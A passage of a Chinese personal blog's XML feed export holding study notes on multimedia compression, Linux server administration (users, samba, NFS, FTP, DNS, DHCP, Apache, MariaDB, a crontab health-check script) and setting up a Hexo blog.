[0.825,0.85)</p><p>4、第三个字符仍为B，缩小为[0.7,0.825]</p><p>0.825-0.7=0.125</p><p>5、第四个字符为C，则区间缩小为</p><p>0.125*0.1=0.0125</p><p>0.825-0.0125=0.8125</p><p>[0.8125,0.8250)</p><h4 id="7-数据压缩标准"><a href="#7-数据压缩标准" class="headerlink" title="7.数据压缩标准"></a>7.数据压缩标准</h4><h5 id="音频压缩标准"><a href="#音频压缩标准" class="headerlink" title="音频压缩标准"></a>音频压缩标准</h5><p>数据：宽带为200Hz~3.4kHz，采样频率为8KHz，采样精度为8bit，传输速率为64kb/s(kbps)</p><p>语音压缩标准：G.722(64kb/s)、G.7221(32kb/s)、G.728(16kb/s)和G.729(8kb/s)</p><p>应用：数字电话通信。</p><h5 id="高保真立体声宽带音频压缩标准"><a href="#高保真立体声宽带音频压缩标准" class="headerlink" title="高保真立体声宽带音频压缩标准"></a>高保真立体声宽带音频压缩标准</h5><p>数据：采样频率44.1kHz，采样精度16bit，速率为每声道705kb/s</p><p>语音压缩标准：MPEG音频</p><p>MPEG-1音频：</p><p>层1（简化的ASPEC）</p><p>层2（即MUSICAM，又称MP2）</p><p>层3（又称MP3）</p><p>MPEG-2音频：多声道，5.1省道形式及7，1声道形式</p><h2 id="第二部分：PS图形图像处理"><a href="#第二部分：PS图形图像处理" class="headerlink" title="第二部分：PS图形图像处理"></a>第二部分：PS图形图像处理</h2><h3 id="一、色彩理论部分"><a href="#一、色彩理论部分" class="headerlink" title="一、色彩理论部分"></a>一、色彩理论部分</h3><h4 id="1-图形与图像的区别"><a href="#1-图形与图像的区别" class="headerlink" title="1.图形与图像的区别"></a>1.图形与图像的区别</h4><table><thead><tr><th>图形</th><th>图像</th></tr></thead><tbody><tr><td>数据量小</td><td>数据量大</td></tr><tr><td>有结构、便于编辑修改</td><td>无结构，不便于编辑修改</td></tr><tr><td>放大缩小不失真</td><td>放大缩小都可能失真</td></tr><tr><td>能准确表示3D景物<br>易于生成所需的不同视图</td><td>3D景物的信息一部分丢失很难生成不同视图</td></tr><tr><td>经过图元-&gt;像素矩阵转换显示</td><td>直接快速显示</td></tr><tr><td>适合表现简单、规范的几何图形</td><td>适合表现自然景物</td></tr></tbody></table><h4 id="2-颜色的三要素——HSB或HIS"><a href="#2-颜色的三要素——HSB或HIS" class="headerlink" title="2.颜色的三要素——HSB或HIS"></a>2.颜色的三要素——HSB或HIS</h4><h5 id="色相——H"><a href="#色相——H" class="headerlink" title="色相——H"></a>色相——H</h5><h5 id="亮度、色调、饱和度S"><a href="#亮度、色调、饱和度S" class="headerlink" title="亮度、色调、饱和度S"></a>亮度、色调、饱和度S</h5><p>亮度是发射光或物体反射光明亮度程度的量度B</p><p>饱和度：颜色强度的度量。</p><p>对于同一色调的彩色光，饱和度越深颜色越鲜明或者越纯。</p><h5 id="对比度"><a href="#对比度" class="headerlink" title="对比度"></a>对比度</h5><h4 id="3-加色原理与减色原理"><a href="#3-加色原理与减色原理" class="headerlink" title="3.加色原理与减色原理"></a>3.加色原理与减色原理</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/06/duo-mei-ti-zong-jie/%E5%9B%BE1.png" alt=""></p><p>青色变黄色=&gt;复制背景，选择-&gt;色彩范围-&gt;容差值选中青色；图像-&gt;通道混合器-&gt;蓝色(B)去掉,关闭-&gt;再次打开，再加上红色，黄色就出现了。</p><p>黄色是因为蓝色被吸收；青色是因为红色被吸收；品红是因为绿色被吸收。</p><h4 id="4-位图图像的基本属性"><a href="#4-位图图像的基本属性" class="headerlink" title="4.位图图像的基本属性"></a>4.位图图像的基本属性</h4><h5 id="（1）图像分辨率与屏幕分辨率的关系"><a href="#（1）图像分辨率与屏幕分辨率的关系" class="headerlink" title="（1）图像分辨率与屏幕分辨率的关系"></a>（1）图像分辨率与屏幕分辨率的关系</h5><p>屏幕分辨率要大于等于图像分辨率才能看到全部</p><p>图像分辨率：单位：ppi(像素每英寸)</p><p>屏幕分辨率：显示器上每单位长度显示的像素数目，通常以点/英寸(dpi)为单位。</p><h5 id="（2）简单色、基本色、增强色、真彩色"><a href="#（2）简单色、基本色、增强色、真彩色" class="headerlink" title="（2）简单色、基本色、增强色、真彩色"></a>（2）简单色、基本色、增强色、真彩色</h5><h5 id="（3）图像文件的数据量——图像数据量大小-B-像素总数-像素深度-8"><a href="#（3）图像文件的数据量——图像数据量大小-B-像素总数-像素深度-8" class="headerlink" title="（3）图像文件的数据量——图像数据量大小(B)=像素总数*像素深度/8"></a>（3）图像文件的数据量——图像数据量大小(B)=像素总数*像素深度/8</h5><h2 id="第三部分：三维建模、交互动画"><a href="#第三部分：三维建模、交互动画" class="headerlink" title="第三部分：三维建模、交互动画"></a>第三部分：三维建模、交互动画</h2><h3 id="一、动画的基本原理"><a href="#一、动画的基本原理" class="headerlink" title="一、动画的基本原理"></a>一、动画的基本原理</h3><p>视觉暂留现象。</p><h4 id="二、基本动画制作"><a href="#二、基本动画制作" class="headerlink" title="二、基本动画制作"></a>二、基本动画制作</h4><h5 id="1-计算机动画的分类"><a href="#1-计算机动画的分类" class="headerlink" title="1.计算机动画的分类"></a>1.计算机动画的分类</h5><p>从动画的视觉空间上划分，动画可分为二维动画和三维动画。</p><h5 id="2-三维模型建模方法的总结"><a href="#2-三维模型建模方法的总结" class="headerlink" title="2.三维模型建模方法的总结"></a>2.三维模型建模方法的总结</h5><p>基本几何体、扩展几何体、二维样条线、修改器、多边形建模、粒子系统</p><p>常见的修改器：挤出、倒角、车削、弯曲、锥化、扭曲、晶格、FFD、网格平滑、细化等。</p><p>弯曲修改器：将当前选定对象围绕指定的轴向产生弯曲变形的效果。该项修改器常用于制作管道、旋转楼梯或人体弯腰等效果。</p><p>锥化修改器：通过缩放对象的两端产生锥化效果，一端放大而另一端缩小，例如制作铅笔。</p><p>扭曲修改器：以根据制定的轴向市对象产生扭曲变形，该效果就像拧湿抹布的效果。</p><p>晶格：将图形的线段或边转换为网格结构。</p><p>自由形式变形（FFD）修改器：整体调节模型表面的效果，客队控制点、晶格和设置体积进行调节。</p><p>网格平滑：增加网格面产生平滑效果。</p><p>细化：对选择的模型或者次物体级进行细化分，一产生更多的面。</p><h4 id="5-3dsMax制作动画的一般步骤"><a href="#5-3dsMax制作动画的一般步骤" class="headerlink" title="5.3dsMax制作动画的一般步骤"></a>5.3dsMax制作动画的一般步骤</h4><h5 id="1⃣️建模："><a href="#1⃣️建模：" class="headerlink" title="1⃣️建模："></a>1⃣️建模：</h5><p>观察建模对象的特征，利用二维线条或三维模型完成建模设置，常用的方法有挤出、车削、布尔、网格细化等。</p><h5 id="2⃣️材质贴图："><a href="#2⃣️材质贴图：" class="headerlink" title="2⃣️材质贴图："></a>2⃣️材质贴图：</h5><p>根据建模对象的特征，先确定材质，在设置贴图。材质可选择建筑材质、双面材质、多维子对象等选项，常用的贴图通道有漫反射贴图、凹凸贴图及镜面贴图等。</p><h5 id="3⃣️灯光与环境："><a href="#3⃣️灯光与环境：" class="headerlink" title="3⃣️灯光与环境："></a>3⃣️灯光与环境：</h5><p>确定主光源及辅助光源。可选择聚光灯及泛光灯，设置主光源的光亮强度、衰减距离及阴影类型。</p><h5 id="4⃣️设置动画："><a href="#4⃣️设置动画：" class="headerlink" title="4⃣️设置动画："></a>4⃣️设置动画：</h5><p>添加摄像机，调整合适角度及距离后，创建关键帧动画或自动关键帧动画。</p><h5 id="5⃣️渲染输出："><a href="#5⃣️渲染输出：" class="headerlink" title="5⃣️渲染输出："></a>5⃣️渲染输出：</h5><p>根据输出文件格式的要求，设置渲染输出保存路径及文件格式，在渲染设置对话框中完成相关设置，也可安装渲染插件，完成环境效果的增强效果，输出最终成品。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络多媒体 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络多媒体 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux服务器</title>
      <link href="/2020/08/26/linux-fu-wu-qi/"/>
      <url>/2020/08/26/linux-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux服务器复习"><a href="#Linux服务器复习" class="headerlink" title="Linux服务器复习"></a>Linux服务器复习</h1><h2 id="第一章-Linux基础知识"><a href="#第一章-Linux基础知识" class="headerlink" title="第一章 Linux基础知识"></a>第一章 Linux基础知识</h2><p>1、Linux最早是由Linus Torvalds开发的</p><p>2、自由软件与免费软件；自由软件是完全免费，可修改可商用，免费软件可使用不可商用</p><p>3、基本的linux命令</p><p>cd：切换目录；</p><p>ls：列出文件 或目录信息；</p><p>cat：显示文件内容；</p><p>pwd：显示当前目录的完整路径；</p><p>mkdir：创建目录；</p><p>rmdir：删除空目录；</p><p>touch：新建普通文件；</p><p>cp：复制文件或目录；</p><p>mv：移动或更改文件和目录的名称；</p><p>rm：删除文件或目录。</p><p>linux分区最主要的两个：SWAP和根分区</p><h2 id="第二章-用户管理"><a href="#第二章-用户管理" class="headerlink" title="第二章 用户管理"></a>第二章 用户管理</h2><p>用户的类型通过用户标识符UID来区分，<strong>系统中所有的用户UID具有唯一性</strong>，Linux有三种用户类型：</p><p>系统管理员：root账户，UID为0，拥有对系统的最高访问权限，类似于Windows的administrator用户</p><p>系统用户：为满足Linux系统管理所内建的账号，通常在安装过程中自动创建，不能用于登陆操作系统。UID在1-999之间，如bin、halt、mail账号等，一般不需要修改该类用户的默认设置；</p><p>普通用户：由root管理员创建，供用户登录系统进行操作使用的账号，UID在1000以上，它类似于Windows系统中users用户组中的账户。</p><h3 id="1、用户配置文件-etc-passwd"><a href="#1、用户配置文件-etc-passwd" class="headerlink" title="1、用户配置文件/etc/passwd"></a>1、用户配置文件/etc/passwd</h3><p>文件/etc/passwd以行为单位，每行以冒号分隔为7个数据域，保存用户的账号信息</p><pre><code>user:x:1001:1001:user:/home/usr:/bin/bash</code></pre><p>上面的分别是</p><pre><code>用户名：密码标志位：UID：GID：用户说明：家目录位置：默认shell</code></pre><h3 id="2、用户口令文件"><a href="#2、用户口令文件" class="headerlink" title="2、用户口令文件"></a>2、用户口令文件</h3><p>由于所有用户对/etc/passwd文件均有读取的权限，为了提高系统的安全性，Linux将用户口令通过算法进行加密，并移至/etc/shadow文件中保存。</p><p>shadow文件中总共有9个字段，每个字段的含义如下：</p><p>1：用户名；</p><p>2：加密密码   加密算法升级为SHA512散列加密算法；</p><p>3：密码最后一次修改日期；</p><p>4：两次密码的修改间隔时间（和第3字段相比）；</p><p>5：密码有效期（和第3字段比）</p><p>6：密码修改到期前的警告天数（和第5字段比）；</p><p>7：密码过期后的宽限天数（和第5字段比）；</p><p>8：账号失效时间（要用时间戳表示）；</p><p>9：保留。</p><h3 id="3、有关账户的命令"><a href="#3、有关账户的命令" class="headerlink" title="3、有关账户的命令"></a>3、有关账户的命令</h3><p>1、创建新用户命令——useradd</p><p>使用这个命令后，在/etc/passwd等4个文件中添加了相关信息；并且在/home目录下创建新用户的主目录</p><p>2、设置或修改用户口令——passwd</p><p>3、设置用户账号属性——usrmod</p><p>-u  UID：修改用户的UID</p><p>-c：用户描述 </p><p>-G：组名         修改用户的附加组</p><p>4、删除用户账户——userdel</p><h2 id="第三章-文件与磁盘管理"><a href="#第三章-文件与磁盘管理" class="headerlink" title="第三章 文件与磁盘管理"></a>第三章 文件与磁盘管理</h2><p>linux的文件和目录的权限，只有rwx三种</p><p>r：读取，对文件而言，具有读取文件内容的权限，对于目录来说，具有浏览目录的权限</p><p>w：写入，对文件而言，具有新增，修改，删除文件内容的权限；对目录来说，具有新建，删除，修改，移动目录内文件的权限</p><p>x：执行，对文件而言，具有执行文件的权限；对目录来说该用户具有进入目录的权限</p><p>Linux中文件的访问权限取决于文件的拥有者、文件所属组的用户和其他用户各自的访问权限。文件所有者，所属组及其他用户权限之间无关联，文件权限的表示方法可以采用数字法表示和字符法表示。</p><h2 id="第四章-网络管理"><a href="#第四章-网络管理" class="headerlink" title="第四章 网络管理"></a>第四章 网络管理</h2><p>/etc/sysconfig/network-scripts/ifcfg-ens33</p><pre><code>TYPE=“Ethernet“            //网卡类型DEVICE=“ens33 “            //网卡设备名BOOTPROTO=static        //设置静态指定IP地址（none、static、dhcp）BROADCAST=192.168.100.255    //设置广播地址HWADDR=00:0c:29:68:74:83    //网卡的物理地址IPADDR=192.168.100.254    //设置网卡的IP地址NETMASK=255.255.255.0        //设置子网掩码GATEWAY=192.168.100.1        //设置网关地址ONBOOT=“yes“            //设置启动激活此网卡</code></pre><p>网络配置命令ifconfig可以用来查看和配置网络状态命令</p><p>用法：</p><p>1、ifconfig：显示所有网卡信息，包括网卡名称、IP地址、子网掩码</p><p>2、ifconfig ens33 192.16820.11 netmask 255.255.255.0：修改IP地址；</p><p>3、ifocnfig ens33 down：关闭网卡；</p><p>4、ifconfig ens33 up：启用网卡。</p><h2 id="第五章-samba服务器的配置管理"><a href="#第五章-samba服务器的配置管理" class="headerlink" title="第五章 samba服务器的配置管理"></a>第五章 samba服务器的配置管理</h2><p>samba服务器可以使用用户在不同的操作系统之间进行文件系统共享、samba</p><p>服务器提供了在windows环境下共享linux中用户目录的一个工具。在linux系统中安装samba 后，winsows用户只需进行简单的用户登录，linux 中的目录就可以作为一个驱动器，在windows利用资源管理器直接操作。</p><p>samba服务器磨人的配置文件为smb.conf，该文件存放在/etc/samba目录下。smb.conf文件根据功能上划分，大致可以分为三个部分，即配置简介、全局变量和共享服务。</p><p>1、安装samba服务</p><p>yum -y install samba</p><p>2、查看samba服务状态</p><p>systemctl status smb</p><p>3、启动samba服务</p><p>systemctl start smb</p><p>4、停止smaba服务</p><p>systemctl stop smb</p><p>5、重启samba服务</p><p>systemctl restart smb</p><h2 id="第六章-NFS服务器的配置管理"><a href="#第六章-NFS服务器的配置管理" class="headerlink" title="第六章 NFS服务器的配置管理"></a>第六章 NFS服务器的配置管理</h2><p>NFS即网络文件系统，它允许网络中的不同计算机之间相互共享资源。NFS客户端可以透明的读写远程NFS服务器上的文件，就像访问额本地文件一样。NFS服务的配置方法相对比较简单，只需在NFS的主配置文件/etc/exports中进行设置，然后启动服务即可。</p><p>Centos7下默认没有exports文件，需要手工新增，所有的配置都需要用户自己定义，每一行记录都代表一个共享资源及访问权限设置，其定义格式如下：</p><pre><code>共享目录 [客户端1(参数)][客户端2(参数)]</code></pre><p>其中各参数含义如下：</p><p>1、共享目录：NFS服务器需共享目录的实际路径，需使用绝对路径</p><p>2、客户端：指可以访问NFS服务器共享目录的计算机。客户端的制定非常灵活，可以指定IP地址、网段等。</p><p>3、参数：对满足客户端匹配条件的客户端进行访问权限、用户映射等操作。于控制共享目录访问权限的参数，该参数只有ro和rw两个。</p><h3 id="管理NFS服务器的命令"><a href="#管理NFS服务器的命令" class="headerlink" title="管理NFS服务器的命令"></a>管理NFS服务器的命令</h3><p>1、查看nfs服务的状态</p><p>systemctl status rpcbind.service</p><p>systemctl status nfs.service</p><p>2、启动NFS服务</p><p>如需启动NFS服务，一定要先启动RPC，然后启动NFS，命令如下：</p><p>systemctl start rpcbind.service</p><p>systemctl start nfs.service</p><p>3、停止NFS服务</p><p>停止NFS服务时不一定要关闭rpcbind服务，命令如下：</p><p>systemctl stop nfs.service</p><p>4、重启NFS服务</p><p>重启NFS服务命令如下：systemctl restart nfs.service</p><h2 id="第七章-FTP服务器的配置管理"><a href="#第七章-FTP服务器的配置管理" class="headerlink" title="第七章 FTP服务器的配置管理"></a>第七章 FTP服务器的配置管理</h2><p>FTP（File Transfer Protocol，文件传输协议）是Internet中应用广泛的服务之一，主要用于在Internet上任意计算机之间相互传输文二尖。</p><p>FTP协议有两种工作模式：</p><p>主动模式（也就是PORT模式）：服务器主动连接客户端的数据端口</p><p>被动模式（也就是PSAV）：服务器被动的等待客户端连接自己的数据接口。</p><h3 id="管理FTP服务器的命令"><a href="#管理FTP服务器的命令" class="headerlink" title="管理FTP服务器的命令"></a>管理FTP服务器的命令</h3><p>1、安装ftp服务</p><p>yum -y install vsftpd</p><p>2、查询vsftpd服务运行状态</p><p>systemctl status vsftpd</p><p>3、启动vsftpd服务</p><p>systemctl start vsftpd</p><p>4、停止vsftpd服务</p><p>systemctl stop vsftpd</p><p>5、重启vsftpd服务</p><p>systemctl restart vsftpd</p><h3 id="vsftpd有以下几个配置文件"><a href="#vsftpd有以下几个配置文件" class="headerlink" title="vsftpd有以下几个配置文件"></a>vsftpd有以下几个配置文件</h3><p>vsftpd：位于/etc/pam.d目录</p><p>​                为vsftpd的PAM配置文件，主要用来加强vsftpd服务器的用户认证</p><p>vsftpd.conf：位于/etc/vsftpd目录</p><p>​                    用来定义用户登录控制、用户权限控制、超时设置、服务器性能选项等FTP服务器的配置</p><p>ftpusers：位于/etc/vsftpd目录下指定了哪些用户账户不能访问FTP服务器</p><p>user_list：位于/etc/vsftpd目录下，该文件里的用户账户在默认情况下也不能访问FTP服务器，仅当vsftpd.conf配置文件里启用userlist_enabled=NO选项才允许访问。</p><h2 id="第八章-DNS服务器的配置管理"><a href="#第八章-DNS服务器的配置管理" class="headerlink" title="第八章 DNS服务器的配置管理"></a>第八章 DNS服务器的配置管理</h2><p>在用TCP/IP协议架设的网络中，每一个节点都有唯一的IP地址，用来作为唯一的标志。然而记住这些毫无记忆规律的IP地址是不可能的。为了方便记忆，产生了域名系统DNS，运行在TCP协议之上。负责将域名转化成实际相对应的IP地址，这个过程称为域名解析，负责域名解析的服务器成为DNS服务器。</p><h3 id="DNS服务器管理命令"><a href="#DNS服务器管理命令" class="headerlink" title="DNS服务器管理命令"></a>DNS服务器管理命令</h3><p>使用yum方式安装DNS服务：</p><p>yum -y install bind</p><p>2、启动DNS服务</p><p>systemctl start named.seeervice</p><p>3、停止DNS服务</p><p>systemctl stop named.service</p><p>4、重启DNS服务</p><p>systemctl restart named.service</p><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p>主局配置文件named.conf</p><p>bind的主配置文二尖named.conf位于/etc/目录下，文件只包括bind的基本配置，并不包含任何DNS区域数据。</p><p>主配置文件named.rfc1912.zones</p><p>位于/etc/目录下，文件包括正向解析内容和反向区域解析内容。可根据需要将nameed.rfc1912.zones复制为全局配置文件中指定的主配置文件。</p><p>区域文件：</p><p>在DNS服务期内，用来存放一个区域内的所有数据(包括主机名和对应IP地址、刷新间隔和过期时间等)的文件。一般存放在/var/named目录下。</p><p>默认正向解析区域配置文件为named.localhost，</p><p>默认反向解析区域配置文件为named.loopback。</p><p>可根据需要用这个两个区域解析文件复制为主配置文件中指定的区域解析文件。</p><h2 id="第九章-DHCP服务器的配置管理"><a href="#第九章-DHCP服务器的配置管理" class="headerlink" title="第九章 DHCP服务器的配置管理"></a>第九章 DHCP服务器的配置管理</h2><p>DHCP是（动态主机配置协议）的缩写，主要是为网络客户机自动动态分配IP地址。</p><p>使用DHCP时，在网络上至少要有一台DHCP服务器，当网络中的DHCP客户端程序发出请求获取IP地址的信息后，DHCP服务器会根据目前已经配置的地址池，提供一个可供使用的IP地址和子网掩码等相关网络配置信息给DHCP客户端。</p><p>DHCP服务器上的IP地址数据库包含如下内容：</p><p>（1）所有客户机的所有配置参数；</p><p>（2）在缓冲池中指定给客户机的有效IP地址，以及手工指定的保留地址</p><p>（3）服务提供租约时间</p><h3 id="DHCP服务器管理命令"><a href="#DHCP服务器管理命令" class="headerlink" title="DHCP服务器管理命令"></a>DHCP服务器管理命令</h3><p>DHCP服务的安装：</p><p>yum -y install dhcp</p><p> 1 启动DHCP服务<br>        systemctl start dhcpd.service<br>         2  停止DHCP服务<br>        systemctl stop dhcpd.service<br>         3 重启DHCP服务<br>        systemctl restart dhcpd.service<br>         4 设置开机自启动DHCP服务<br>        systemctl enable dhcpd.service</p><h3 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h3><p>DHCP服务的主配置文件dhcp.conf位于/etc/dchp/目录下，但该文件没有任何配置信息，需要将位于“/usr/share/doc/dhcp-4.2.5/”目录下的样例文件dhcpd.conf.example复制覆盖到主配置文件</p><p>dhcp.conf文件通常由三部分组成：参数、声明和选项</p><pre><code>subnet 192.168.1.0  netmask 255.255.255.0 {   range 192.168.1.50  192.168.1.200 ;      # 定义IP地址池为192.168.1.50到192.168.1.200   option domain-name-servers 192.168.1.2;  # 指定DNS服务器地址：192.168.1.2    option routers  192.168.1.2 ;    # 指定网关地址为： 192.168.1.2   default-lease-time 86400;         #指定租约时间为86400秒（1天）            }host a {      hardware ethernet 00:50:56:C0:00:08;      fixed-address 192.168.1.50         #为该MAC地址的设备分配IP地址：192.168.1.50}</code></pre><h2 id="第十章-Apache服务器的配置管理"><a href="#第十章-Apache服务器的配置管理" class="headerlink" title="第十章 Apache服务器的配置管理"></a>第十章 Apache服务器的配置管理</h2><p>Apache是一种开放源码的web服务器软禁。因其具有良好的跨平台和安全特性，目前几乎是主流 UNIX、Linux和BSD系统（如FreeBSD）选用的主流WEB服务器软件</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>1、安装apache服务</p><p>yum -y install httpd</p><p>2、httpd服务启动</p><p>systemctl start httpd</p><p>3、停止httpd服务</p><p>systemctl stop httpd</p><p>4、重启http服务</p><p>systemctl restart  httpd</p><h3 id="文件-2"><a href="#文件-2" class="headerlink" title="文件"></a>文件</h3><p>Apache服务器的主配置文件为/etc/httpd/conf/httpd.conf文件，文件内容主要由全局环境设置、主服务器设置和虚拟主机设置三部分组成。</p><p>全局环境设置：这一部分的指令将影响整个Apache服务器，该部分以“#ServerRoot:”作为开始标志。</p><p>主服务器配置：这一部分的指令是为所有虚拟主机提供默认值，该部分从“#’Main‘server configuration”开始标志。</p><p>虚拟主机设置：apache服务器可利用虚拟主机功能在一台服务器上设置多个web站点，这样就可以当做多个web服务器。</p><h2 id="第十一章-数据库服务器的配置管理"><a href="#第十一章-数据库服务器的配置管理" class="headerlink" title="第十一章 数据库服务器的配置管理"></a>第十一章 数据库服务器的配置管理</h2><p>数据库的应用领域非常广泛。不论是政府部门、银行、证券或大型企业等，实施信息化建设都需要使用数据库。</p><p>在centos6以前，默认使用的是mysql，从centos7开始 默认使用mariadb。这是因为mysql是开源软件，所有权属于SUN公司。而SUN被甲骨文收购，MySQL的所有权也落入甲骨文的手中，而Oracle也是甲骨文旗下的商业数据库软件，所以MySQL有被闭源的风险。MariaDB是MySQL的创始人开发的一个分支，可以完全兼容MySQL，所以从CentOS7开始，使用MariaDB代替MySQL，规避MySQL可能存在闭源带来的风险。</p><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><p>1、MariaDB的安装</p><p>yum -y install mariadb-server</p><p>2、查询mariadb服务运行状态</p><p>systemctl status mariadb</p><p>3、启动mariadb服务</p><p>systemctl start mariadb</p><p>4、停止mariadb服务</p><p>systemctl stop mariadb</p><p>5、重启mariadb服务</p><p>systemctl restart mariadb</p><h2 id="第十二章-服务器的维护"><a href="#第十二章-服务器的维护" class="headerlink" title="第十二章 服务器的维护"></a>第十二章 服务器的维护</h2><p>用户的crontab设置</p><p>​    crontab[选项]</p><p>​            -e：编辑crontab定时任务</p><p>​            -l：查询crontab任务</p><p>​            -r：删除当前用户所有的crontab任务</p><p>crontab -e    编辑crontab 定时任务<br>标准格式：* * * * *  command<br>前面5个<em>代表时间 command是要执行的脚本<br>第1个</em>   一个小时的第几分钟      0-59<br>第2个*   一天当中的第几小时      0-23<br>第3个*   一个月中的第几天         1-31<br>第4个*   一年中的第几月            1-12<br>第5个*   一周当中的星期几         0-7（0和7都代表周日）</p><pre><code>例：  5  5  *  *   1-5    /root/sh/autotest.sh  表示：  周一到周五每天凌晨5:05分执行 /root/sh/autotest.sh服务脚本</code></pre><p>使用vim  /root/sh/autotest.sh  命令编辑如下脚本：<br>#!/bin/bash<br>port=$(nmap -sT 192.168.1.110  |  grep 80/tcp  | grep http  |  awk ‘{print $2}’ )<br>#使用nmap命令扫描服务器，并截取apache服务的状态，赋予变量port<br>if  [  “$port”  = =  “open”  ]<br>      then<br>            echo  “$(date) http is ok”  &gt;&gt;  /tmp/autostart-acc.log</p><p>当Apache服务正常运行时 将“当前时间+http is OK” 追加写入到/tmp/autostart-acc.log文件中</p><p>​      else<br>​           systemctl restart httpd  &amp;&gt;  /dev/null<br>​           echo  “$(date)  restart  httpd !!”  &gt;&gt;  /tmp/autostart-err.log<br>  #当Apache服务异常时重启服务，并将”当前时间+ restart  httpd !! “追加写入到/tmp/autostart-err.log文件中<br>   fi</p><p>/tmp/autostart-acc.log 文件记录的是Apache服务正常运行的时记录的当前时间的日志文件<br>       /tmp/autostart-err.log 文件记录的是Apache服务异常运行的时记录的当期时间的日志文件 </p><p>整个脚本的功能：<br>脚本使用nmap命令扫描服务器，并截取Apache服务的状态<br>当服务正常运行时，将当前时间记录到/tmp/autostart-acc.log日志文件<br>当服务异常运行时，重启Apache服务，并将当前时间记录到/tmp/autostart-err.log日志文件</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>blog博客搭建</title>
      <link href="/2020/08/21/blog/"/>
      <url>/2020/08/21/blog/</url>
      
        <content type="html"><![CDATA[<h3 id="搭建一个属于自己的博客"><a href="#搭建一个属于自己的博客" class="headerlink" title="搭建一个属于自己的博客"></a>搭建一个属于自己的博客</h3><p>1.安装Node.js</p><p>2.查看node.js的版本</p><pre class="line-numbers language-shell"><code class="language-shell">node -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.查看npm的版本</p><pre><code>npm -v</code></pre><p>4.切换成国内的打包工具（使用淘宝的）</p><pre><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></pre><p>5.查看cnpm的版本</p><pre><code>cnpm -v</code></pre><p>6.安装博客的框架（hexo）</p><pre><code>cnpm install -g hexo-cli</code></pre><p>7.查看hexo的版本</p><pre><code>hexo -v</code></pre><p>8.安装git</p><p>9.创建一个本地目录（最好不要放在C盘）</p><pre><code>E:/blog</code></pre><p>10.初始化hexo</p><pre><code>hexo init</code></pre><p>会下载hexo框架</p><p>11.启动hexo服务</p><pre><code>hexo s</code></pre><p>s代表server</p><p>然后浏览器访问localhost:4000就可以访问到了</p><p>12.创建博客</p><pre><code>hexo n "我的第一个博客"</code></pre><p>就会在blog</p><p>13.创建git仓库</p><pre><code>https://gitee.com/samedi/TestBlog.git</code></pre><p>14.安装git的部署工具</p><pre><code>cnpm install --save hexo-deployer-git</code></pre><ol start="15"><li>修改blog根目录下的_config.yml文件</li></ol><pre><code>deploy:    type: 'git'    repo: https://gitee.com/samedi/TestBlog.git    branch: master</code></pre><p>16.报错的话</p><pre><code>再次安装git的部署工具或者运行git config --global user.name "bbsamedi"git config --global user.email "1584518096@qq.com"</code></pre><p>17.发布项目到码云</p><pre><code>hexo d</code></pre><p>18.使用Gitee Pages服务发布项目成一个网站</p><p>19.添加样式</p><p>修改blog根目录下的_config.yml</p><pre><code>url: http://samedi.gitee.ioroot: /testblog/peimalink: :year/:month/:day/:title/</code></pre><p>20.修改hexo的主题</p><p>先下载yilia-plus</p><pre><code>cd ./themes/git clone https://github.com/JoeyBling/hexo-theme-yilia-plus.gitmv hexo-theme-yilia-plus yilia-plus</code></pre><p>21.显示侧边栏</p><pre><code>cnpm i hexo-generator-json-content --save</code></pre><ul><li><p>在根目录_config.yml里添加配置：</p></li><li><pre><code>jsonContent:  meta: false  pages: false  posts:    title: true    date: true    path: true    text: false    raw: false    content: false    slug: false    updated: false    comments: false    link: false    permalink: false    excerpt: false    categories: false    tags: true</code></pre></li></ul><p>首先新建页面，执行下面的命令</p><p>hexo new page navigate</p><p>修改 navigate 目录下的 index.md 的格式</p><hr><p>title: 导航<br>date: 2020-05-09 11:19:14<br>type: “navigate”</p><p>layout: “navigate”</p><p>在主题配置文件中添加导航</p><pre><code># main menu navigation url and icon# 配置菜单导航的名称、路径和图标icon.menu:  Index:    url: /    icon: fas fa-home  统计:    url: /    icon: fas fa-sitemap    children:      - name: 分类        url: /categories        icon: fas fa-bookmark       - name: 标签        url: /tags        icon: fas fa-tags           - name: 归档        url: /archives        icon: fas fa-archive  About:    url: /about    icon: fas fa-address-card  Contact:    url: /contact    icon: fas fa-comments  友人帐:    url: /friends    icon: fas fa-share-alt  赞助墙:    url: /sponsor    icon: fa fa-credit-card  导航:    url: /navigate    icon: fas fa-location-arrow</code></pre><p>在 matery/layout 下新建 navigate.ejs</p><pre><code>&lt;div class="navi-height bg-cover pd-header "&gt;    &lt;div class=" link-box container"&gt;        &lt;!-- 搜索框 --&gt;        &lt;div class="baidu baidu-2 large-screen"&gt;            &lt;form name="f" action="https://www.baidu.com/" target="_blank"&gt;                &lt;div id="Select-2"&gt;                    &lt;div class="Select-box-2" id="baidu"&gt;                        &lt;ul style="height: 46px;"&gt;                            &lt;li class="this_s"&gt;百 · 度&lt;/li&gt;                            &lt;li class="bing_s"&gt;必 